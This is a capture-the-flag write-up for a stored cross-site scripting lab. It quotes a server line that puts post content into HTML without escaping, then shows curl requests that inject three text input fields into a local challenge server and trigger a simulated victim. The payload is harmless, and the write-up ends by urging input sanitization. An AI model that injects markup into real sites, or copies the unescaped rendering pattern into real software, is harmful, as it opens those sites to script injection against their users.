# 📘 Stored XSS Challenge Writeup

## 🧩 Challenge Description

This challenge explores **Stored XSS (Cross-Site Scripting)**. You're given access to a web server at `/challenge/server` where users can post messages. These messages are stored in a database and later displayed to all visitors. 

There's also a simulated victim at `/challenge/victim` that visits the site and looks for **3 `<input type="text">` elements**. If found, the victim reveals the flag.

> 🎯 Goal: Inject a post that results in three `<input type="text">` elements being rendered in the victim's browser.

## 🧠 Code Analysis

By reviewing the server code, we learned:

- It uses `sqlite3` to store posts in a temporary file.
- The `GET /` handler renders each post using:
  ```python
  page += "<hr>" + post["content"] + "\n"
  ```
  This means the **user-submitted content is directly inserted into the HTML** without escaping or sanitization.
- Therefore, **any raw HTML we post will be interpreted and rendered by the browser**, making the site vulnerable to stored XSS.

## ✅ Exploitation

To exploit this, we submit a post containing 3 textboxes in HTML:

```html
<input type="text"><input type="text"><input type="text">
```

We submit it via the form or using `curl`:

```bash
curl -X POST -d 'content=<input type="text"><input type="text"><input type="text">' http://challenge.localhost:80/
```

Then, we trigger the victim:

```bash
curl "http://challenge.localhost:80/challenge/victim?url=http://challenge.localhost:80/"
```

If our HTML is successfully injected and rendered, the victim will see 3 textboxes and give us the flag.

## 🔎 Debugging Tips

- If unsure whether your payload is rendered, visit the site manually (GUI browser or curl).
- Check the page source to see if your HTML is interpreted or appears as plain text.
- Use variations of the payload if needed (e.g., add `<br>` or wrap in `<div>`).

## 🏁 Conclusion

This challenge demonstrates the core concept of **Stored XSS**, where **unescaped user input** is inserted directly into the HTML page served to users. Because the content wasn’t sanitized, we were able to inject and render HTML directly in the browser.

Always sanitize and encode user input before rendering to prevent these attacks!
